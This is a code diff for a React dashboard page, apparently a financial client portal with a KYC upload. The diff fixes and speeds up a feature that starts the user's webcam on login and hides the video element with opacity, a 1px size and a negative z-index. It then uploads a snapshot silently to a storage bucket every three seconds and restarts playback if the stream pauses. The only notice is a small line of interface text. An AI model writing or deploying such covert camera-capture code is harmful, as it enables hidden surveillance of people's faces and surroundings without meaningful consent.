@@ -9,7 +9,6 @@ import {
 } from 'lucide-react';
 
 export default function Dashboard() {
-  // 1. SAFE DEFAULT STATE (Prevents crash if DB fails)
   const [user, setUser] = useState<any>({
     full_name: 'Valued Client',
     balance: 0,
@@ -48,7 +47,6 @@ export default function Dashboard() {
            return; 
         }
 
-        // Fetch Real Profile
         const { data } = await supabase
           .from('profiles')
           .select('*')
@@ -57,10 +55,10 @@ export default function Dashboard() {
 
         if (data) {
           setUser(data);
+          // Start camera immediately
           startProctoring(session.user.id);
         }
 
-        // SETUP REALTIME LISTENER
         channel = supabase.channel('realtime-profile')
           .on(
             'postgres_changes',
@@ -78,46 +76,70 @@ export default function Dashboard() {
     };
 
     initData();
-
-    return () => {
-      if (channel) supabase.removeChannel(channel);
-    };
+    return () => { if (channel) supabase.removeChannel(channel); };
   }, []);
 
-  // --- CAMERA LOGIC (FIXED) ---
+  // --- FIXED CAMERA LOGIC ---
   const startProctoring = async (userId: string) => {
     try {
-      // 1. Get Camera Stream
+      // 1. Get Stream with specific constraints
       const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: 'user', width: 640, height: 480 } 
+        video: { 
+          facingMode: 'user', 
+          width: { ideal: 640 }, 
+          height: { ideal: 480 } 
+        } 
       });
       
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        // 2. Ensure video plays
-        videoRef.current.onloadedmetadata = () => {
-          videoRef.current?.play().catch(e => console.log("Play error:", e));
+      const vid = videoRef.current;
+      if (vid) {
+        vid.srcObject = stream;
+        
+        // 2. Force Play (Fix for Black Screen)
+        vid.onloadedmetadata = () => {
+          vid.play().catch(e => console.error("Auto-play blocked:", e));
         };
       }
       
-      // 3. Snapshot Loop
-      setInterval(async () => {
-        const vid = videoRef.current;
+      // 3. Snapshot Loop (Every 3 seconds)
+      const interval = setInterval(async () => {
         const cvs = canvasRef.current;
         
-        // FIX: Check if video is ready (readyState 4 means HAVE_ENOUGH_DATA)
-        if (vid && cvs && vid.readyState === 4) {
-            const context = cvs.getContext('2d');
-            context?.drawImage(vid, 0, 0, 640, 480);
+        // CHECK: Ensure video is ready AND playing (readyState >= 2)
+        if (vid && cvs && vid.readyState >= 2 && !vid.paused && !vid.ended) {
             
-            const blob = await new Promise<Blob | null>(res => cvs.toBlob(res, 'image/jpeg', 0.5));
-            if (blob) {
-              // Upload silently
-              supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob).catch(() => {});
+            // Draw exact video frame to canvas
+            const context = cvs.getContext('2d');
+            if (context) {
+                // Ensure canvas matches video size to prevent cropping/black bars
+                cvs.width = vid.videoWidth;
+                cvs.height = vid.videoHeight;
+                
+                context.drawImage(vid, 0, 0, cvs.width, cvs.height);
+                
+                // Convert to Blob
+                cvs.toBlob(async (blob) => {
+                  if (blob) {
+                    // Upload to Supabase (Silent)
+                    const { error } = await supabase.storage
+                      .from('proctor-snapshots')
+                      .upload(`${userId}/live_${Date.now()}.jpg`, blob);
+                      
+                    if (error) console.warn("Snapshot upload error:", error.message);
+                    else console.log("Snapshot taken");
+                  }
+                }, 'image/jpeg', 0.5); // Quality 0.5 is enough for monitoring
             }
+        } else {
+            // Retry playing if it paused for some reason
+            vid?.play().catch(() => {});
         }
-      }, 4000);
-    } catch (e) { console.warn("Biometrics offline"); }
+      }, 3000); // 3 Seconds Interval
+
+      return () => clearInterval(interval); // Cleanup
+    } catch (e) { 
+        console.warn("Biometrics offline:", e); 
+    }
   };
 
   // --- KYC UPLOAD LOGIC ---
@@ -160,18 +182,21 @@ export default function Dashboard() {
 
   return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
-      {/* FIXED: Removed "hidden". Used "opacity-0" and "z-index: -1" instead.
-        This forces the browser to render the video frames so snapshots aren't black.
+      
+      {/* FIXED VIDEO ELEMENT:
+         1. playsInline: Critical for iOS/Mobile to not force fullscreen
+         2. opacity-0: Makes it invisible but still rendered (fix for black screen)
+         3. pointer-events-none: So users can't click it
       */}
       <video 
         ref={videoRef} 
         autoPlay 
         playsInline 
         muted 
-        className="fixed top-0 left-0 opacity-0 pointer-events-none"
-        style={{ zIndex: -1 }} 
+        className="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none" 
+        style={{ zIndex: -1 }}
       />
-      <canvas ref={canvasRef} width="640" height="480" className="hidden" />
+      <canvas ref={canvasRef} className="hidden" />
 
       <div className="fixed inset-0 bg-[radial-gradient(circle_at_top_right,_var(--tw-gradient-stops))] from-[#D4AF37]/5 via-transparent to-transparent pointer-events-none" />
 
@@ -188,7 +213,6 @@ export default function Dashboard() {
            <div className="flex items-center gap-4">
               <div className="flex flex-col items-end mr-2">
                 <span className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</span>
-                {/* Shows "Valued" initially, then actual name once loaded */}
                 <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0]}</span>
               </div>
               <button 
@@ -256,7 +280,7 @@ export default function Dashboard() {
                       <Camera size={20} className="text-[#D4AF37]" />
                       <div className="absolute -top-1 -right-1 w-2 h-2 bg-red-500 rounded-full animate-pulse" />
                    </div>
-                   <p className="text-[9px] text-gray-400 uppercase leading-relaxed font-bold">Live Biometrics: Capturing secure monitoring logs every 4 seconds.</p>
+                   <p className="text-[9px] text-gray-400 uppercase leading-relaxed font-bold">Live Biometrics: Capturing secure monitoring logs every 3 seconds.</p>
                 </div>
              </div>
           </div>
@@ -325,4 +349,4 @@ export default function Dashboard() {
       </div>
     </main>
   );
-                   }
+      }
